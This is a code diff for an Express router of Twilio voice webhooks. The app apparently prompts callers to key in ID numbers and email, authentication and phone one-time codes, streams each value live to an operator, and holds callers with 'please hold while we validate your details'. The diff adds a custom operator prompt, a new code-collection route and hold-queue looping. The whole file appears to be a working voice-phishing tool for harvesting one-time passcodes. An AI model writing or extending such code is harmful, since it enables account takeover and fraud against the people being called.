@@ -102,12 +102,23 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             twiml.hangup();
             
         } else if (currentAction === 'playing_music') {
-            // *** THE FIX: Correct way to use <Enqueue> ***
-            // The queue SID is the argument to the .enqueue() method
             twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
                 action: `/webhooks/leave-queue/${sessionId}`,
                 method: 'POST'
             });
+            
+        } else if (currentAction === 'custom_voice') {
+            const customMessage = callData.custom_message;
+            const gather = twiml.gather({
+                numDigits: 20,
+                action: `/webhooks/collect-custom/${sessionId}`,
+                method: 'POST',
+                finishOnKey: '#',
+                timeout: 10
+            });
+            gather.say(customMessage || 'Please enter your response followed by the pound key.');
+            twiml.say('No input received. Goodbye.');
+            twiml.hangup();
             
         } else {
             twiml.say('Please wait for admin instructions.');
@@ -126,8 +137,6 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         res.send(twiml.toString());
     }
 });
-
-// ... (keep all your other routes exactly the same: handle-consent, leave-queue, collect-id, etc.) ...
 
 router.post('/handle-consent/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
@@ -181,7 +190,10 @@ router.post('/leave-queue/:sessionId', async (req, res) => {
     if (session.rows[0] && session.rows[0].current_action !== 'playing_music') {
         twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
     } else {
-        twiml.hangup();
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
     }
     
     res.type('text/xml');
@@ -212,7 +224,7 @@ router.post('/collect-id/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        // *** THE FIX: Correct way to use <Enqueue> ***
+        twiml.say('Thank you. Please hold while we validate your details.');
         twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
             action: `/webhooks/leave-queue/${sessionId}`,
             method: 'POST'
@@ -227,8 +239,6 @@ router.post('/collect-id/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// ... (apply the same fix to collect-email-otp, collect-auth-otp, collect-phone-otp) ...
-
 router.post('/collect-email-otp/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
@@ -242,6 +252,7 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'email_otp', Digits]);
         io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        twiml.say('Thank you. Please hold while we validate your details.');
         twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', { action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
@@ -264,6 +275,7 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'auth_otp', Digits]);
         io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        twiml.say('Thank you. Please hold while we validate your details.');
         twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', { action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
     } else {
         twiml.say('No code received. Goodbye.');
@@ -286,9 +298,32 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'phone_otp', Digits]);
         io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        twiml.say('Thank you. Please hold while we validate your details.');
         twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', { action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
+        twiml.hangup();
+    }
+    res.type('text/xml');
+    res.send(twiml.toString());
+});
+
+router.post('/collect-custom/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const { Digits } = req.body;
+    const twiml = new VoiceResponse();
+    const io = req.app.get('io');
+    
+    if (Digits) {
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        const contactId = session.rows[0].contact_id;
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'custom', Digits]);
+        io.emit('data_collected', { session_id: sessionId, type: 'custom', value: Digits });
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', { action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
+    } else {
+        twiml.say('No input received. Goodbye.');
         twiml.hangup();
     }
     res.type('text/xml');
